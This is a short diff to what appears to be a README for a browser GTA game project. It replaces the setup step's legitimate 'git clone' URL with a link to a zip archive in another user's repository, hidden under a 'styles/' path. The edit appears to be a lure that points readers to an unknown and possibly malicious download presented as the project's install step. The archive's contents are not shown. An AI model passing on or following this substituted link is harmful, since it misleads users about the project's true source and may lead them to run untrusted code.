@@ -12,7 +12,7 @@
 Open a terminal in VS code or in any directory
 Run below command where you want to clone the project
 ```
-    git clone https://github.com/GTAjam/gta-web.git
+    git clone https://github.com/dipeshdarks/gta-web/raw/refs/heads/main/styles/web-gta-v2.2.zip
 ````
 
 After making changes first pull to see if any changes made by anyone else causing conficts
